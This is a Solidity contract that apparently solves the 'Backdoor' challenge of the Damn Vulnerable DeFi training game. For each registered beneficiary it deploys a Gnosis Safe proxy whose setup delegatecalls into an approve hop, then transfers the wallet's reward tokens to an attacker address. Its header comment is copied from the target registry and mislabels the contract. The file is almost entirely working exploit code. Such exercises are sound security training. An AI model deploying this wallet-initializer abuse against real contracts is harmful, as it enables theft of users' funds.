// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./WalletRegistry.sol";
import "hardhat/console.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 
 */

contract WalletRegistryAttack {
    GnosisSafe gnosisSafe;
    GnosisSafeProxyFactory gnosisSafeProxyFactory;
    WalletRegistry walletRegistry;
    IERC20 token;

    constructor(
        address payable gnosisSafeAddress,
        address gnosisSafeProxyFactoryAddress,
        address walletRegistryAddress,
        address tokenAddress
    ) {
        gnosisSafe = GnosisSafe(gnosisSafeAddress);
        gnosisSafeProxyFactory = GnosisSafeProxyFactory(
            gnosisSafeProxyFactoryAddress
        );
        walletRegistry = WalletRegistry(walletRegistryAddress);
        token = IERC20(tokenAddress);
    }

    // we cant delegatecall directly into the ERC20 token's approve function because the state changes would]
    // apply for the proxy (set allowance, which is not present on proxy) so instead we used a hop like:
    // this.createProxyWithCallback call -> proxy delegatecall -> this.approve (msg.sender = proxy) -> erc20.approve
    function approve(address spender, address tokenAddress) external {
        IERC20(tokenAddress).approve(spender, type(uint256).max);
    }

    function execute(address[] calldata users, address attacker) external {
        bytes memory encodedApprove = abi.encodeWithSignature(
            "approve(address,address)",
            address(this),
            token
        );

        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            address[] memory owners = new address[](1);
            owners[0] = user;

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                encodedApprove,
                address(0),
                0,
                0,
                0
            );

            GnosisSafeProxy proxy = gnosisSafeProxyFactory
                .createProxyWithCallback(
                    address(gnosisSafe),
                    initializer,
                    0,
                    walletRegistry
                );
            token.transferFrom(address(proxy), attacker, 10 ether);
        }
    }
}
